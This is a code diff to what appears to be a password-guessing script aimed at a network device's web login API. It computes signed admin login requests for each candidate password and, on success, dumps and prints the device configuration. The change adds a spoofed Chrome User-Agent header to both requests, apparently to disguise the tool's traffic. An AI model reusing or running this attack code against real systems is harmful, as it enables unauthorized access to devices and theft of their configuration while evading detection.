@@ -50,11 +50,13 @@ def get_epoch():
 
 
 def sendRequest(target,username,password):
+	useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+	headers={"User-Agent": useragent}
 	epoch = get_epoch()
 	path = '/login/?_='+str(epoch)+'&_login=true&_username=admin'
 	sig = computeSignature(path,sha1Pass(password)).hexdigest()
 	url = 'http://'+target+':'+args.port+'/login/?_='+str(epoch)+'&_username=admin&_login=true&_signature='+str(sig)
-	req = requests.get(url)
+	req = requests.get(url,headers=headers)
 
 	# Pull config as confirmation if valid
 	if req.status_code == 200 and req.text == '{}':
@@ -63,7 +65,7 @@ def sendRequest(target,username,password):
 		sig2 = computeSignature(path2,sha1Pass(password)).hexdigest()
 		config_url = 'http://'+target+':'+args.port+'/config/main/get/?_='+str(epoch2)+'&_username=admin&_signature='+str(sig2)
 		print("Success with "+password+"! Dumping Configuration: ")
-		config_req = requests.get(config_url)
+		config_req = requests.get(config_url,headers=headers)
 		print(config_req.text)
 		exit()
 	else:
